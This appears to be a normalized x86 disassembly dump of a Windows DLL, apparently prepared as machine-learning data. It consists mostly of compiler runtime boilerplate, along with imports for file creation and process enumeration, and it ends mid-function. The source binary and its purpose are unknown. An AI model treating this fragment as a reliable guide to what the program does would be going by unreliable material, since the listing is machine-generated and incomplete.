retn
sub_100348b2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10034907
push [ rw-data ]
call sub_1002eeed
pop ecx
retn
sub_10034a88
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10030124
pop ecx
sub_10034ac4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10034ad3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10034b03
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_10034b1a
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
push 0x8
call [ SetLastError@IAT ]
sub_10034b9c
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10034c48
push 0x4
call sub_10030124
pop ecx
retn
sub_100358dd
push 0x0
call sub_100357dd
pop ecx
retn
sub_100359e6
push 0x0
call sub_100358e6
pop ecx
retn
sub_10035d46
push 0x0
call sub_100359ef
pop ecx
retn
sub_100375e6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1002e680
sub_100376f8
push 0x4
call sub_10030124
pop ecx
retn
sub_1003785e
push 0x4
call sub_10030124
pop ecx
retn
sub_10037a7d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10037a45
pop ecx
pop ecx
pop ebp
retn
sub_10037be3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037ba1
add esp 0x10
pop ebp
retn
sub_10037c1c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10037a90
pop ecx
pop ecx
pop ebp
retn
sub_10037c2f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10037b03
pop ecx
pop ecx
pop ebp
retn
sub_1003895b
mov eax rw-data
retn
sub_10038961
mov eax rw-data
retn
sub_100389ba
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10038967
add esp 0x10
pop ebp
retn
sub_10038b66
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_10038bd4
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10039ed0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10039db9
add esp 0x10
pop ebp
retn
sub_1003a0ff
push 0xa
call sub_10030124
pop ecx
retn
sub_1003a202
push 0xa
call sub_10030124
pop ecx
retn
sub_1003a2c0
push 0xb
call sub_10030124
pop ecx
retn
sub_1003a3b5
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1003a2ec
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1003a400
call eax
retn
sub_1003a403
push 0x2
call sub_1002ab7b
pop ecx
retn
sub_1003a4b7
mov eax rw-data
retn
sub_1003a4bd
mov eax rw-data
retn
sub_1003a4c3
mov eax rw-data
retn
sub_1003a4c9
mov eax rw-data
retn
sub_1003a4cf
mov edi edi
push ebp
mov ebp esp
call sub_1003a4b7
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_1003a4e0
mov edi edi
push ebp
mov ebp esp
call sub_1003a4bd
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_1003a4f1
mov edi edi
push ebp
mov ebp esp
call sub_1003a4c3
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_1003a7ae
push 0x7
call sub_10030124
pop ecx
retn
sub_1003a88e
push 0x6
call sub_10030124
pop ecx
retn
sub_1003a9f7
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1003ce6d
add esp 0xc
pop ebp
retn
sub_1003ce98
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1003e353
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003e265
add esp 0x10
pop ebp
retn
sub_1003e431
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1003ed48
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ec8c
add esp 0xc
pop ebp
retn
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1003f21b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003f384
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
add ecx 0x58
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10002255
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004155b
mov edi edi
push ebp
mov ebp esp
call sub_1004de2e
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebp
retn 0x4
sub_10041573
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_10035d46
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_10041701
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10027c56
push [ esi + 0xc ]
call sub_10027c56
pop ecx
pop ecx
pop esi
retn
sub_1004171a
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10027c56
push [ esi + 0x10 ]
call sub_10027c56
push [ esi + 0x14 ]
call sub_10027c56
add esp 0xc
pop esi
retn
sub_10041a8c
push 0x5
pop eax
retn
sub_10041ab3
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10027a85
pop ecx
sub_10041af6
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021ef2
add esp 0x10
pop ebp
retn 0xc
sub_10041b72
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_100227ec
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10041bb9
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1002277f
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10041c36
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10041c00
sub_10041cea
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10041ca2
sub_10041da7
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10027a85
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10041e6e
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041762
mov [ esi ] r--data
pop esi
retn
sub_10041ea9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100025f5
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_10041ec7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100070ba
add esp 0xc
pop ebp
retn
sub_10041f4b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041ea9
add esp 0x10
pop ebp
retn
sub_10041f89
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000227b
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_10041fa7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041f89
add esp 0x10
pop ebp
retn
sub_100422a2
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041762
mov [ esi ] r--data
pop esi
retn
sub_100422ba
mov ax [ ecx + 0xe ]
retn
sub_100422e6
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10027a85
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10042558
mov ecx [ ebp - 0x14 ]
call sub_1004171a
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_100427b0
mov ecx [ ebp - 0x14 ]
call sub_10041762
push 0x0
push 0x0
call sub_1002ae74
int3
sub_10042ace
mov ecx [ ebp - 0x14 ]
call sub_10041762
push 0x0
push 0x0
call sub_1002ae74
int3
sub_10042b53
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
call sub_1004203e
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10042b6d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10041f09
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10042c35
mov ax [ ecx + 0xc ]
retn
sub_10042c3a
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1004171a
mov [ esi ] r--data
pop esi
retn
sub_10042f0c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10042b6d
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_10042f7d
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_10042e00
push esi
push esi
call sub_1002ae74
int3
sub_100430f4
push 0x0
push 0x1
call sub_10042e00
retn
sub_10043163
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10043dce
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100025cf
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10043fc7
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10043fe3
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001362
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10043fff
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001362
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004401b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001362
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100442b7
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004398d
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100444b7
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100439de
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_100446b0
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004398d
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100446cc
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004398d
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100463d1
mov ecx [ ebp - 0x14 ]
call sub_10041701
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_100480f8
mov ecx [ ebp - 0x14 ]
call sub_10041701
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_1004852d
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041701
mov [ esi ] r--data
pop esi
retn
sub_10049f31
mov eax [ ecx + 0x10 ]
retn
sub_10049f35
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041701
mov [ esi ] r--data
pop esi
retn
sub_1004b24f
or eax 0xffffffff
retn 0x8
sub_1004b29b
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041762
mov [ esi ] r--data
pop esi
retn
sub_1004b2b3
mov al [ ecx + 0xd ]
retn
sub_1004b2b7
mov eax [ ecx + 0x1c ]
retn
sub_1004b2bb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1004b2cc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1004b304
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10027a85
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1004b504
mov ecx [ ebp - 0x14 ]
call sub_10041762
push 0x0
push 0x0
call sub_1002ae74
int3
sub_1004b61c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10002255
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1004bae4
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004bb00
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004bb1c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004ce69
mov ecx [ ebp - 0x14 ]
call sub_10041701
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_1004d21b
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10041701
mov [ esi ] r--data
pop esi
retn
sub_1004de2e
mov edi edi
push esi
call sub_1002d957
mov esi [ eax + 0x4 ]
call sub_1002d931
mov edx eax
mov eax esi
pop esi
retn
sub_1004e160
lea ecx [ ebp - 0x10 ]
jmp sub_10021eac
sub_1004e168
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e183
mov ecx [ ebp - 0x10 ]
jmp sub_1000f26d
sub_1004e18b
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001f21
sub_1004e196
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e1b1
lea ecx [ ebp - 0x10 ]
jmp sub_10021eac
sub_1004e1b9
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1004e1c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e1e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e200
mov ecx [ ebp - 0x10 ]
jmp sub_10002699
sub_1004e208
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10002699
sub_1004e213
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e230
mov ecx [ ebp - 0x10 ]
jmp sub_10002699
sub_1004e238
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10002699
sub_1004e243
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e260
mov ecx [ ebp - 0x10 ]
jmp sub_10001d9b
sub_1004e268
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e290
lea ecx [ ebp - 0x28 ]
jmp sub_10002699
sub_1004e298
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_10002699
sub_1004e2b1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e2d0
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004e2d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e300
lea ecx [ ebp - 0x27c ]
jmp sub_10002699
sub_1004e30b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x288 ]
mov ecx [ edx - 0x28c ]
xor ecx eax
call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e340
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e360
mov ecx [ ebp - 0x10 ]
jmp sub_10002699
sub_1004e368
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e390
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
jmp sub_10001f21
sub_1004e3a9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x20 ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e3d0
lea ecx [ ebp - 0x4c ]
jmp sub_10001f21
sub_1004e3d8
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004e3e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e400
mov ecx [ ebp - 0x14 ]
jmp sub_10023280
sub_1004e408
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
jmp sub_100230b0
sub_1004e413
mov eax [ ebp + 0x8 ]
push eax
call sub_100272e8
pop ecx
retn
sub_1004e41e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e440
mov ecx [ ebp - 0x10 ]
jmp sub_10001d9b
sub_1004e448
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e470
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004e478
lea ecx [ ebp - 0xb8 ]
jmp sub_10001f21
sub_1004e483
lea ecx [ ebp - 0x9c ]
jmp sub_10002699
sub_1004e48e
lea ecx [ ebp - 0xb8 ]
jmp sub_10002699
sub_1004e499
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xd4 ]
mov ecx [ edx - 0xd8 ]
xor ecx eax
call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e4d0
lea ecx [ ebp - 0xd4 ]
jmp sub_10001f21
sub_1004e4db
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004e4e3
lea ecx [ ebp - 0xd4 ]
jmp sub_10002699
sub_1004e4ee
lea ecx [ ebp - 0xd4 ]
jmp sub_10001f21
sub_1004e4f9
lea ecx [ ebp - 0xb8 ]
jmp sub_10002699
sub_1004e504
lea ecx [ ebp - 0x9c ]
jmp sub_10002699
sub_1004e50f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xec ]
mov ecx [ edx - 0xf0 ]
xor ecx eax
call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e540
mov ecx [ ebp - 0x10 ]
jmp sub_1000f26d
sub_1004e548
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e570
mov ecx [ ebp - 0x10 ]
jmp sub_1000f26d
sub_1004e578
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001f21
sub_1004e583
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e5a0
mov eax [ ebp - 0xa0 ]
push eax
call sub_100272e8
pop ecx
retn
sub_1004e5ae
mov eax [ ebp - 0xa4 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xa4 ] 0xfffffffe
lea ecx [ ebp - 0x9c ]
jmp sub_10001f21
sub_1004e5d0
mov eax [ ebp - 0xa4 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0xa4 ] 0xfffffffd
lea ecx [ ebp - 0x80 ]
jmp sub_1000794c
sub_1004e5ef
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e610
mov eax [ ebp - 0x10 ]
push eax
call sub_100272e8
pop ecx
retn
sub_1004e61b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e640
lea ecx [ ebp - 0x1c ]
jmp sub_10021eac
sub_1004e648
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e670
mov ecx [ ebp - 0x54 ]
jmp sub_10021eac
sub_1004e678
mov ecx [ ebp - 0x54 ]
add ecx 0x4
jmp sub_10001f21
sub_1004e683
mov ecx [ ebp - 0x54 ]
add ecx 0x20
jmp sub_10001f21
sub_1004e68e
mov ecx [ ebp - 0x54 ]
add ecx 0x3c
jmp sub_10001f21
sub_1004e699
mov ecx [ ebp - 0x54 ]
add ecx 0x58
jmp sub_10001f21
sub_1004e6a4
lea ecx [ ebp - 0x50 ]
jmp sub_10001f21
sub_1004e6ac
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x50 ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e6d0
mov ecx [ ebp - 0x88 ]
jmp sub_1000f26d
sub_1004e6db
lea ecx [ ebp - 0x84 ]
jmp sub_1000794c
sub_1004e6e6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x80 ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_10027150
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e720
lea ecx [ ebp - 0x14 ]
jmp sub_10007dbd
sub_1004e728
mov eax [ ebp - 0x10 ]
push eax
call sub_100272e8
pop ecx
retn
sub_1004e733
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e750
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004e75e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e780
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004e78e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e7b0
mov ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004e7b8
lea ecx [ ebp - 0x28 ]
jmp sub_10002699
sub_1004e7c0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e7e0
mov ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_1004e7e8
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004e7f0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e820
mov eax [ ebp - 0x48 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffe
lea ecx [ ebp - 0x28 ]
jmp sub_10002699
sub_1004e839
mov eax [ ebp - 0x48 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffd
lea ecx [ ebp - 0x44 ]
jmp sub_10002699
sub_1004e852
mov eax [ ebp - 0x48 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffb
mov ecx [ ebp + 0x4 ]
jmp sub_10002699
sub_1004e86b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e890
lea ecx [ ebp - 0x28 ]
jmp sub_10001f21
sub_1004e898
mov ecx [ ebp - 0x2c ]
jmp sub_10001d9b
sub_1004e8a0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e8c0
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004e8c8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e8f0
lea ecx [ ebp - 0x114 ]
jmp sub_10023120
sub_1004e8fb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x120 ]
mov ecx [ edx - 0x124 ]
xor ecx eax
